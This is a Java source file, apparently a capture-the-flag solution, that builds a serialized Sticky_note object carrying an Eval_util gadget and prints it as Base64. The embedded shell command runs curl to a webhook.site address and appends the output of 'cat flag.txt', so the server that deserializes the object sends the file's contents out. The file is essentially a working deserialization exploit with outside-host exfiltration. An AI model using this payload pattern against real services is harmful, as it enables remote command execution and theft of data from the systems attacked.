import com.example.demo.*;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;

public class Main {
    public static void main(String[] args) throws IOException, InterruptedException {
        // System.out.println("Hello World");  
        
        Sticky_note one = new Sticky_note("EXPLOIT", 0);
        one.data = new Eval_util();
        one.data.val = "curl http://webhook.site/a660520b-56a2-4071-8a18-7a9ebabce724?flag=`cat flag.txt`";

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(one);
        objectOutputStream.close();
        String r = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
        System.out.println(r);  
        
    }
}